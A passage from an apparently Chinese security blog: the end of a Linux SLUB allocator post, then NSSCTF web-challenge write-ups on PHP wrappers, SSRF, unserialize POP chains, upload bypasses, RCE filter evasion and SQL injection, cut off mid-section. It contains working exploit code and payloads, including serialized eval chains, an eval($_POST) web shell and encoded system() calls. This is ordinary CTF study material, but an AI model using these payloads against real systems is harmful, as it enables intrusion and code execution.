redo;\n\t}\n\t//new_slab_objects会检查当前kmalloc-xx对应的node下\n    //是否存在partial可供分配,没有则会从buddy伙伴系统中分配slab页框描述符\n\tfreelist = new_slab_objects(s, gfpflags, node, &c);\n\t//后面就是一些相关的检查及加载freelist\n\tif (unlikely(!freelist)) {\n\t\tslab_out_of_memory(s, gfpflags, node);\n\t\treturn NULL;\n\t}\n\tpage = c->page;\n\tif (likely(!kmem_cache_debug(s) && pfmemalloc_match(page, gfpflags)))\n\t\tgoto load_freelist;\n    //............\n\tdeactivate_slab(s, page, get_freepointer(s, freelist), c);\n\treturn freelist;\n}\n```\n\n### (1)本地CPU的`partial`\n\n首先就是判断本地`CPU`，即`cpu_slab`的`partial`，其也为一个`page`页框，会与其他的页框依据`struct list_head lru;`域组成双向循环链表。\n\n- 如果存在，则将该`partial`当作一个`slab`描述页框`page`，遍历其`struct list_head lru;`域，找到合适的`slab`描述页框`page`，赋值给`cpu_slab->page`，并且该`partial`也会在`slub_set_percpu_partial(c, page);`函数中被原本的`partial`的`next`覆盖。\n\n  请忽略这个`freelist`上还有值，截图的时候没有分配光`freelist`。\n\n  ![image-20220519210608695](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519210608695.png)\n\n  完成之后如下所示，被覆盖掉\n\n  ![image-20220519211038094](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211038094.png)\n\n- 然后进入`redo`，依据新赋值的`page`加载`freelist`，并且保存在`page`中的`freelist`被置空，最终如下\n\n  ![image-20220519211452815](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211452815.png)\n\n  \n\n### (2)`node`中的`partial`\n\n然后进入`new_slab_objects`函数判断本`kmalloc-xx`对应的`node`中是否存在`partial`，存在则进行相关赋值后，直接返回`freelist`\n\n```c\nstatic inline void *new_slab_objects(struct kmem_cache *s, gfp_t flags,\n\t\t\tint node, struct kmem_cache_cpu **pc)\n{\n\tvoid *freelist;\n\tstruct kmem_cache_cpu *c = *pc;\n\tstruct page *page;\n\n\t//.....\n    //查看本kmalloc-xx对应的node中的partial是否存在\n    //存在进行相关赋值后直接返回freelist了\n\tfreelist = get_partial(s, flags, node, c);\n\tif (freelist)\n\t\treturn freelist;\n\n    //本kmalloc-xx对应的node中的partial不存在,从buddy伙伴系统分配\n\tpage = new_slab(s, flags, node);\n\tif (page) {\n\t\tc = raw_cpu_ptr(s->cpu_slab);\n\t\tif (c->page)\n\t\t\tflush_slab(s, c);\n\t\t/*\n\t\t * No other reference to the page yet so we can\n\t\t * muck around with it freely without cmpxchg\n\t\t */\n\t\tfreelist = page->freelist;\n\t\tpage->freelist = NULL;\n\n\t\tstat(s, ALLOC_SLAB);\n\t\tc->page = page;\n\t\t*pc = c;\n\t}\n\n\treturn freelist;\n}\n\n```\n\n这里有点奇怪的是，遍历对应`struct kmem_cache`的`kmalloc-xx`下的`node`时，其`partial`指向的是`page`的`struct list_head lru;`域地址，而非实际的`page`地址，所以真实的`page`地址为`struct list_head lru;`域地址减去`0x8`。\n\n![image-20220519201826071](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519201826071.png)\n\n之后即从该`page`中取`freelist`进行赋值给本地的`kmem_cache_cpu`下`cpu_slab`的`freelist`，即本地缓冲池。\n\n## 3.buddy分配\n\n如上述所示，在`new_slab_objects()`中判断`partial`不存在之后，即从buddy伙伴算法中分配新的`slab`页框描述符，之后就太复杂了，后续再学把。\n\n","tags":["Linux内核"],"categories":["Linux内核","内存分配"]},{"title":"NSSCTF-Web安全入门刷题","url":"/2023/03/09/NSSCTF-Web安全入门/","content":"\n\n\n\n\n\n# [SWPUCTF 2021 新生赛]jicao\n\n```php\n<?php\n    highlight_file('index.php');\ninclude(\"flag.php\");\n$id=$_POST['id'];\n$json=json_decode($_GET['json'],true);\nif ($id==\"wllmNB\"&&$json['x']==\"wllm\")\n{echo $flag;}\n?>\n```\n\n传入两个参数即可\n\n# [SWPUCTF 2021 新生赛]Do_you_know_http\n\n访问如下\n\n![image-20230107120854983](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png)\n\n浏览器不对，那么首先需要修改`User-Agent`为`WLLM`\n\n![image-20230107120925542](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120925542.png)\n\n跟随重定向后跳转到`a.php`\n\n![image-20230107121003165](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121003165.png)\n\n发现来源`IP`不对，那么需要修改`X-Forwarded-For`字段\n\n![image-20230107121230587](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121230587.png)\n\n跟随重定向后得到最终`flag`\n\n![image-20230107121237694](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121237694.png)\n\n# [SWPUCTF 2021 新生赛]gift_F12\n\n确实如名字，`F12`在元素资源中可以找到\n\n![image-20230107145303596](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107145303596.png)\n\n# [第五空间 2021]WebFTP\n\n`dirsearch`扫描之后，在`readm.txt`中找到对应的超级管理员账号密码`admin/admin888`\n\n登录进去之后，在`phpinfo.php`中找到`flag`，或者不用登录，直接`/phpinfo.php`就能找到，应该是所谓非预期，下面看看预期解\n\n同样该`WebFTP`是`github`上一个老框架，可以在`/Readme/mytz.php`中存在敏感信息泄露漏洞\n\n![image-20230107153916700](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107153916700.png)\n\n或者`seay`好像可以审计出来\n\n![image-20230107154534824](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107154534824.png)\n\n对应泄露为`/Readme/mytz.php?act=phpinfo`\n\n# [SWPUCTF 2021 新生赛]easy_md5\n\n`md5`弱比较\n\n![image-20230107155030276](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155030276.png)\n\n使用`QNKCDZO`和`s214587387a`即可\n\n![image-20230107155126859](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155126859.png)\n\n# [SWPUCTF 2021 新生赛]include\n\n提示传入`file`参数，然后得到源码\n\n![image-20230107155613921](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155613921.png)\n\n由于最后会使用`include_once`将对应`file`包含进来，那么可以使用相关的`php`伪协议\n\n```\n/?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n`base64`解码后得到`flag`\n\n![image-20230107155718000](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155718000.png)\n\n# [SWPUCTF 2021 新生赛]PseudoProtocols\n\n![image-20230107160859666](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160859666.png)\n\n首先看到提示，并且`URL`中为`/...?wllm=...`，很明显就是想让我们填一个东西，试试`hint.php`填入\n\n![image-20230107160953981](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160953981.png)\n\n啥也没有，那么尝试用一下`php`伪协议\n\n```\nhttp://1.14.71.254:28530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php\n```\n\n![image-20230107161034318](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161034318.png)\n\n可以看到出来了，`base64`解一下查看内容\n\n![image-20230107161117359](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161117359.png)\n\n让我们访问`/test2222222222222.php`\n\n![image-20230107161156905](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161156905.png)\n\n主要关注如下，需要设置`a`，然后其内容为`I want flag`\n\n![image-20230107161205486](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161205486.png)\n\n由于用的是`file_get_contents`函数，那么可以使用`data`数据流\n\n```\n/test2222222222222.php?a=data://text/plain,I%20want%20flag\n```\n\n得到`flag`\n\n![image-20230107161327121](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161327121.png)\n\n# [NISACTF 2022]easyssrf\n\n访问之后提示`SSRF`\n\n那么访问一下本地网站下面的`index.php`，不太行，那试试`flag.php`\n\n![image-20230107163522282](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163522282.png)\n\n再试试`/fl4g`\n\n![image-20230107163611667](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163611667.png)\n\n不太行，试试`file`协议\n\n![image-20230107163829405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163829405.png)\n\n访问一下\n\n![image-20230107163903762](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163903762.png)\n\n输出`file`，这里不用管那个判断，没啥用，只要`file`里面不包含`file`字符串就行，那么直接`/flag`就能得到\n\n![image-20230107164119474](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107164119474.png)\n\n# [SWPUCTF 2021 新生赛]ez_unserialize\n\n访问啥也没有，`dirsearch`一下，发现`robots.txt`，访问一下\n\n![image-20230107165705357](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165705357.png)\n\n接着访问`/cl45s.php`\n\n![image-20230107165729931](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165729931.png)\n\n可以看到反序列化设置一下对应属性即可\n\n```\nhttp://1.14.71.254:28869/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;}\n```\n\n![image-20230107165833572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165833572.png)\n\n# [SWPUCTF 2021 新生赛]no_wakeup\n\n![image-20230107170206722](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170206722.png)\n\n尝试用`CVE-2016-7124`\n\n```\nhttp://1.14.71.254:28150/class.php?p=O:6:%22HaHaHa%22:3:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;}\n```\n\n成功\n\n# [ZJCTF 2019]NiZhuanSiWei\n\n写过，首先用`data`流和`php`伪协议读取`useless.php`\n\n```\n/?file=php://filter/read=convert.base64-encode/resource=useless.php&text=data://text/plain,welcome%20to%20the%20zjctf\n```\n\n![image-20230107170914355](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170914355.png)\n\n然后借助`tostring`方法，将`Flag->file`设置为`flag`即可，通过反序化打印出来\n\n```\n/?file=useless.php&text=data://text/plain,welcome%20to%20the%20zjctf&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}\n```\n\n`flag`在注释中\n\n# [SWPUCTF 2021 新生赛]pop\n\n![image-20230107174901023](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107174901023.png)\n\n访问之后，可以看到考`pop`链，这里即为\n\n```php\nw22m->__destruct(){echo $this->w00m;}\n//设置成员$this->w00m为w33m类,进而调用到w33m->__toString\n\n\nw33m->__toString(){$this->w00m->{$this->w22m}();}\n//设置成员$this->w00m为w44m类,$this->w22m为\"Getflag\"\n//进而调用到w44m->Getflag()函数\n```\n\n得到如下`exp`\n\n```php\n<?php\n\nclass w44m{\n\n    private  $admin = 'w44m';\n    protected  $passwd = '08067';\n\n    public function Getflag(){\n        if($this->admin === 'w44m' && $this->passwd ==='08067'){\n            $flag = \"flag{aaaaa}\";\n            echo $flag;\n        }else{\n            echo $this->admin;\n            echo $this->passwd;\n            echo 'nono';\n        }\n    }\n}\n\nclass w22m{\n    public $w00m;\n    public function __destruct(){\n        echo $this->w00m;\n    }\n}\n\nclass w33m{\n    public $w00m;\n    public $w22m;\n    public function __toString(){\n        $this->w00m->{$this->w22m}();\n        return \"aaa\";\n    }\n}\n\n$w3Obj = new w33m();\n$w2Obj = new w22m();\n$w4Obj = new w44m();\n\n$w2Obj->w00m = $w3Obj;\n$w3Obj->w00m = $w4Obj;\n$w3Obj->w22m = \"Getflag\";\n\n\n$a = serialize($w2Obj);\necho $a;\n?>\n```\n\n结果如下\n\n```\nO:4:\"w22m\":1:{s:4:\"w00m\";O:4:\"w33m\":2:{s:4:\"w00m\";O:4:\"w44m\":2:{s:11:\"w44madmin\";s:4:\"w44m\";s:9:\"*passwd\";s:5:\"08067\";}s:4:\"w22m\";s:7:\"Getflag\";}}\n```\n\n之后由于`W44m`中`private`和`protected`的关系，打印不出来`\\x00`这样的字符，所以我们需要按照规则使用`%00`进行补充\n\n- `private`\n\n  变为`\\x00className\\x00memberName`\n\n- `public`\n\n  仍然为原始的\n\n- `protected`\n\n  变为`\\x00*\\x00memberName`\n\n最终得到`EXP`\n\n```\n/?w00m=O:4:\"w22m\":1:{s:4:\"w00m\";O:4:\"w33m\":2:{s:4:\"w00m\";O:4:\"w44m\":2:{s:11:\"%00w44m%00admin\";s:4:\"w44m\";s:9:\"%00*%00passwd\";s:5:\"08067\";}s:4:\"w22m\";s:7:\"Getflag\";}}\n```\n\n得到`flag`\n\n\n\n# [NISACTF 2022]babyserialize\n\n依据相关代码，主要是在`NISA.__invoke`中有如下代码\n\n![image-20230108113757842](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108113757842.png)\n\n那么只要调用到`NISA.__invoke`函数，并且控制`NISA.txw4ever`成员即可做到任意函数调用。\n\n首先给出总的函数调用链\n\n```\nTianXiWei.__wakeup->Ilovetxw.__call->four.__set->Ilovetxw.__toString->NISA.__invoke->@eval($this->txw4ever);\n```\n\n接下来具体分析一下\n\n- `Ilovetxw.__toString->NISA.__invoke`\n\n  `Ilovetxw.__toString`方法如下\n\n  ![image-20230108114004672](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108114004672.png)\n\n  `__invoke`性质：当尝试以调用函数的方式调用对象的时候，就会调用该方法\n\n  那么通过设置`Ilovetxw.su`为某个`NISA`对应对象，即可调用到`NISA.__invoke`\n\n- `four.__set->Ilovetxw.__toString`\n\n  `four.__set`方法如下\n\n  ![image-20230108120158522](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120158522.png)\n\n  这里可以看到调用了`strtolower($this->a)`，查一下手册\n\n  [PHP: strtolower - Manual](https://www.php.net/manual/zh/function.strtolower.php)\n\n  ![image-20230108120354823](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120354823.png)\n\n  可以看到会将传入变量转化为`String`，也就是说如果传入一个对象，那么就会调用该对象的`__toString`方法来将它转化为`String`。那么这里就将`four.a`设置为`Ilovetxw`对应对象，即可调用到`Ilovetxw.__toString`\n\n- `Ilovetxw.__call->four.__set`\n\n  `Ilovetxw.__call`方法如下\n\n  ![image-20230108120814927](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120814927.png)\n\n  `__set`的相关性质：在给不可访问的`protected`或者`private`或者不存在的属性赋值的时候，会被调用\n\n  这里就可以设置`Ilovetxw->huang`为`four`的对象，而`four`中没有`fun`成员属性，所以就会调用到`four->__set`。\n\n- `TianXiWei.__wakeup->Ilovetxw.__call`\n\n  `TianXiWei.__wakeup`方法如下\n\n  ![image-20230108121124426](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121124426.png)\n\n  `__call`相关性质：在对象中调用一个不可访问的方法的时候，会被执行\n\n  那么可以设置`TianXiwei->ext`为`Ilovetxw`对象，而`Ilovetxw`没有`nisa`方法，就会调用到`Ilovetxw->__call`方法。\n\n- `TianXiWei.__wakeup`\n\n  对于`__wakeup`的性质不用多说，在反序列化的时候就会自动调用了。\n\n相关总结如下\n\n```\n@eval($this->txw4ever);\n//设置NISA.txw4ever即可执行命令\n\nNISA.__invoke\n//通过Ilovetxw.__toString调用,需要设置IlovetxwObj.su为class NISA\n__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法\n\nIlovetxw.__toString\n//通过four.__set调用strtolower,从而调用到__toString。需要设置fourObj.a为class IlovetxwObj\n\n\nfour.__set\n//通过Ilovetxw.__call调用,需要设置IlovetxwObj.huang为class four\n__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用\n\nIlovetxw.__call\n//通过TianXiWei.__wakeup调用，需要设置ext为class Ilovetxw\n__call():在对象中调用一个不可访问的方法的时候，会被执行\n\nTianXiWei.__wakeup\n\nunserialize(TianXiWei)调用TianXiWei.__wakeup\n```\n\n那么最终的`EXP`\n\n```php\n<?php\ninclude \"waf.php\";\nclass NISA{\n    public $fun=\"aaa\";\n    public $txw4ever;\n    public function __wakeup()\n    {\n        if($this->fun==\"show_me_flag\"){\n            //hint();\n        }\n    }\n\n    function __call($from,$val){\n        $this->fun=$val[0];\n    }\n\n    public function __toString()\n    {\n        echo $this->fun;\n        return \" \";\n    }\n    public function __invoke()\n    {\n        //checkcheck($this->txw4ever);\n        @eval($this->txw4ever);\n    }\n}\n\nclass TianXiWei{\n    public $ext;\n    public $x;\n    public function __wakeup()\n    {\n        $this->ext->nisa($this->x);\n    }\n}\n\nclass Ilovetxw{\n    public $huang;\n    public $su;\n\n    public function __call($fun1,$arg){\n        $this->huang->fun=$arg[0];\n    }\n\n    public function __toString(){\n        $bb = $this->su;\n        return $bb();\n    }\n}\n\nclass four{\n    public $a=\"TXW4EVER\";\n    private $fun='abc';\n\n    public function __set($name, $value)\n    {\n        $this->$name=$value;\n        if ($this->fun = \"sixsixsix\"){\n            strtolower($this->a);\n        }\n    }\n}\n\n\n\n//func checkcheck($data){\n//  if(preg_match(......)){\n//      die(something wrong);\n//  }\n//}\n\n//function hint(){\n//    echo \".......\";\n//    die();\n//}\n\n$TianXiWeiObj = new TianXiWei();\n$IlovetxwObj = new Ilovetxw();\n\n$TianXiWeiObj->ext = $IlovetxwObj;  //$this->ext->nisa($this->x);调用到Ilovetxw->__call();\n\n$fourObj = new four();\n$IlovetxwObj->huang = $fourObj; //$this->huang->fun=$arg[0];调用到four->__set();\n\n$fourObj->a = $IlovetxwObj;//strtolower($this->a);调用到$IlovetxwObj.__toString();\n\n$NISAObj = new NISA();\n$IlovetxwObj->su = $NISAObj;// $bb = $this->su;return $bb();调用到NISA.__invoke();\n\n$NISAObj->txw4ever = \"System('cat /fllllllaaag');\";//@eval($this->txw4ever);调用到system(\"ipconfig\");\n\n$myString = serialize($TianXiWeiObj);\necho urlencode($myString);\n//unserialize($myString); //调用TianXiWei.__invoke();\n?>\n```\n\n首先可以看看`hint`中有啥，要将`NISA->fun`设置为`\"show_me_flag\"`\n\n![image-20230108121600420](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121600420.png)\n\n结果如下\n\n![image-20230108121739396](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121739396.png)\n\n然后改掉`NISA->fun`，因为`hint`函数中有`die`函数调用\n\n![image-20230108121804523](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121804523.png)\n\n看看根目录有啥\n\n```\nO%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D\n```\n\n发现有错\n\n![image-20230108121855956](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121855956.png)\n\n应该是`checkcheck`函数\n\n![image-20230108121939989](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121939989.png)\n\n可能是`preg_match`进行了一些过滤，这里把`system`变成大写就行，查看根目录\n\n```\nO%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22System%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D\n```\n\n![image-20230108122127917](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108122127917.png)\n\n然后`cat /fllllllaaag `即可，最终`exp`\n\n```php\n<?php\ninclude \"waf.php\";\nclass NISA{\n    public $fun=\"aaaaa\";\n    public $txw4ever;\n    public function __wakeup()\n    {\n        if($this->fun==\"show_me_flag\"){\n            //hint();\n        }\n    }\n\n    function __call($from,$val){\n        $this->fun=$val[0];\n    }\n\n    public function __toString()\n    {\n        echo $this->fun;\n        return \" \";\n    }\n    public function __invoke()\n    {\n        //checkcheck($this->txw4ever);\n        @eval($this->txw4ever);\n    }\n}\n\nclass TianXiWei{\n    public $ext;\n    public $x;\n    public function __wakeup()\n    {\n        $this->ext->nisa($this->x);\n    }\n}\n\nclass Ilovetxw{\n    public $huang;\n    public $su;\n\n    public function __call($fun1,$arg){\n        $this->huang->fun=$arg[0];\n    }\n\n    public function __toString(){\n        $bb = $this->su;\n        return $bb();\n    }\n}\n\nclass four{\n    public $a=\"TXW4EVER\";\n    private $fun='abc';\n\n    public function __set($name, $value)\n    {\n        $this->$name=$value;\n        if ($this->fun = \"sixsixsix\"){\n            strtolower($this->a);\n        }\n    }\n}\n\n\n\n//func checkcheck($data){\n//  if(preg_match(......)){\n//      die(something wrong);\n//  }\n//}\n\n//function hint(){\n//    echo \".......\";\n//    die();\n//}\n\n$TianXiWeiObj = new TianXiWei();\n$IlovetxwObj = new Ilovetxw();\n\n$TianXiWeiObj->ext = $IlovetxwObj;  //$this->ext->nisa($this->x);调用到Ilovetxw->__call();\n\n$fourObj = new four();\n$IlovetxwObj->huang = $fourObj; //$this->huang->fun=$arg[0];调用到four->__set();\n\n$fourObj->a = $IlovetxwObj;//strtolower($this->a);调用到$IlovetxwObj.__toString();\n\n$NISAObj = new NISA();\n$IlovetxwObj->su = $NISAObj;// $bb = $this->su;return $bb();调用到NISA.__invoke();\n\n$NISAObj->txw4ever = \"System('cat /fllllllaaag');\";//@eval($this->txw4ever);调用到system(\"ipconfig\");\n\n$myString = serialize($TianXiWeiObj);\necho urlencode($myString);\n//unserialize($myString); //调用TianXiWei.__invoke();\n\n\n//O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22System%28%27cat+%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D\n\n?>\n```\n\n# [SWPUCTF 2021 新生赛]easyupload1.0\n\n检测文件头，改一下就行了，`flag`在`phpinfo`里面\n\n# [SWPUCTF 2021 新生赛]easyupload2.0\n\n检测后缀和文件头\n\n# [SWPUCTF 2021 新生赛]easyupload3.0\n\n可以上传`.htaccess`来将`png`作为`php`\n\n# [SWPUCTF 2021 新生赛]caidao\n\n加载了一张图片，但是一般来说，如果只加载图片，并不会能连接的\n\n![image-20230109200923250](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109200923250.png)\n\n但是用蚁剑连上，才发现`index.php`里面有\n\n```\n<?php\necho('<html><head><style>body{background:url(caidao.png) top left;background-size:100%;}</style></head></html>');\n@eval($_POST['wllm']);\n?>\n```\n\n# [SWPUCTF 2021 新生赛]easyrce\n\n普通的`shell`\n\n![image-20230109201242190](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201242190.png)\n\n# [SWPUCTF 2021 新生赛]babyrce\n\n提示如下\n\n![image-20230109201720863](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201720863.png)\n\n用`burpsuite`给`COOKIE`添加一下`admin`字段为1\n\n![image-20230109201814743](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201814743.png)\n\n访问`rasalghul.php`，直接命令执行，过滤空格，用`${IFS}`代替空格即可\n\n![image-20230109201940275](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201940275.png)\n\n\n\n# [SWPUCTF 2021 新生赛]hardrce\n\n命令执行，但是过滤了很多东西\n\n![image-20230109205721004](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205721004.png)\n\n但是由于是`php7`，所以可以利用取反来执行命令，参考`p神`的：\n\n[一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)\n\n[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)\n\n![image-20230109205707061](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205707061.png)\n\n主要结论如下：\n\n![image-20230109205850748](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205850748.png)\n\n即用`python`稍微写一下就行\n\n![image-20230109210209173](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210209173.png)\n\n```php\n(~%8c%86%8c%8b%9a%92)(~%93%8c%df%d0);//system('ls /')\n```\n\n知道`flag`名字了\n\n![image-20230109210301490](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210301490.png)\n\n```php\n(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%d0%99%93%93%93%93%93%9e%9e%9e%9e%9e%9e%98%98%98%98%98%98%98);//system('cat /flllllaaaaaaggggggg')\n```\n\n# [SWPUCTF 2021 新生赛]finalrce\n\n![image-20230110140811427](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110140811427.png)\n\n`exec`直接执行命令，但是过滤了很多东西，包括`ls`也过滤了，但是命令行中有比较特殊符号反引号以及`\\`，这个常用来连接命令，可以看到如下例子，其实是差不多的。\n\n![image-20230110141330808](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141330808.png)\n\n所以这里可以用`l\\s`来进行绕过，其他命令也是类似。\n\n那么就差一个回显了，由于重定向符号`>`也被禁止了，那么这里可以用到`tee`命令，该命令可以通过管道符`|`将前一个命令的执行结果写入到文件中，效果如下\n\n![image-20230110141934420](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141934420.png)\n\n那么就可以通过该命令来将需要命令结果写入到文件中，然后访问文件即可访问到命令结果。\n\n```\nurl=l\\s%20/%20|%20tee%201.txt\n```\n\n对应访问\n\n![image-20230110142057595](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110142057595.png)\n\n同样道理获取`flag`，但是这里还过滤了`la`，所以同样道理，给`flllllaaaaaaggggggg`的对应`la`处加上`\\`符号也是一样的。\n\n```\nurl=c\\at%20/flllll\\aaaaaaggggggg%20|%20tee%202.txt\n```\n\n访问`2.txt`即可得到`flag`\n\n# [SWPUCTF 2021 新生赛]easy_sql\n\n参数是`wllm`，几个`sql`注入常见考点\n\n## 前置知识\n\n同样的，对应`sql`语句也会有注释，常用的注释有下\n\n- `#`：但是在`url`中该符号有特殊意义，所以使用的时候需要改成编码`%23`才行\n- `--`：用的时候通常需要为`--空格 `形式才能正常解析，而在`sql`中`+`和`--`连用时作用和空格类似，所以`--+`成为常见的`sql`注入语句，当然`--%20`也是一样的。\n\n所以这里先使用单引号`'`将之闭合，然后语句最后使用`--+`来将后面的多余语句进行注释，比如原语句是\n\n```sql\n...where wllm = '用户输入' and ... \n```\n\n用户输入为`1' order by 1--+`，那么结果即为\n\n```sql\n...where wllm = '1' order by 1--+' and ... \n```\n\n原本的`' and ... `这个就不会执行了，而`order by 1`会顺利执行，完成相关的`sql`语句注入查询。\n\n## 1.判断类型\n\n首先需要判断注入类型，常见的有字符，数字，时间，布尔等。\n\n输入`wllm=1`正常回显，但是输入`wllm=1'`会显示错误，代表引号匹配不对，表明是字符型的注入。\n\n```\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n```\n\n## 2.字段数查询\n\n需要知道该表有几个字段，才能进行后续的回显点查询，这里可以用到`order by`来进行查询。\n\n`order by `的意思就是依据输入的字段来进行排序，这里既可以输入字段名字，也可以输入字段序号，比如下表\n\n![image-20230110173717231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173717231.png)\n\n输入`order by games_played`和输入`order by 4`其效果是一样的，但是如果输入`order by 5`，而该表又只有4个字段，那么就会出错，如下\n\n![image-20230110173850560](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173850560.png)\n\n可以通过这个方法来判断有几个字段，这里输入`order by 4`回显错误，表明字段数为3。\n\n![image-20230110175556882](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175556882.png)\n\n## 3.回显点查询\n\n可以看到输入`wllm=1`是正常回显的\n\n![image-20230110173359149](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173359149.png)\n\n而`xxx`和`yyy`就是可能存在的回显点，那么需要判断这个回显点是在那个字段，这里就可以使用常见的`select 1,2,3`这种了。\n\n### select 